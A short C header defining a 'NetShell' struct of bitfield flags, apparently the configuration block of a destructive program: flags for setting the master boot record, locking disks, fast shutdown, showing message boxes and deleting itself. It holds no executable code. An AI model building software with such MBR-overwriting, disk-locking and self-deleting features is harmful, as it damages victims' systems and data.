#pragma once

#include"std.h"


struct NetShell
{
	unsigned int is_settingMBR : 1;
	unsigned int is_showmsgbox : 1;
	unsigned int is_running : 1;
	unsigned int is_lockdisk : 1;
	unsigned int is_fastshutdown : 1;
	unsigned int is_deleleself : 1;
	unsigned int shutdown_mode : 2;
	unsigned int check_bit : 32;
};
